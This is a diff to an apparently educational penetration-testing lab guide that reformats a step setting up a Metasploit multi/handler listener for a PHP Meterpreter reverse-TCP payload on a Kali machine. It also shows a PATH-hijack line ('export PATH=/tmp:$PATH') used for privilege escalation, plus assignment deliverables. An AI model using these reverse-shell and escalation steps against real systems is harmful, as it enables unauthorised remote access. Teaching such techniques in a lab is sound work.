@@ -79,8 +79,13 @@ Whenever I mention an IP address in a command, use YOUR ip address for that mach
 
 9. **Set Up the Listener on Kali**:
 
+- Run the below command and wait for msfconsole to start
    ```bash
    msfconsole
+   ```
+
+- Then run the below commands with your Kali IP
+  ```bash
    use exploit/multi/handler
    set payload php/meterpreter_reverse_tcp
    set LHOST 192.168.174.130
@@ -382,6 +387,7 @@ export PATH=/tmp:$PATH
   - One step by step Privesc path and root confirmation
   - Step by step attempts at 1 Bonus or Mystery task
 - Submit a 1-paragraph reflection on the escalation path used and what you understand!
+
 
 
 
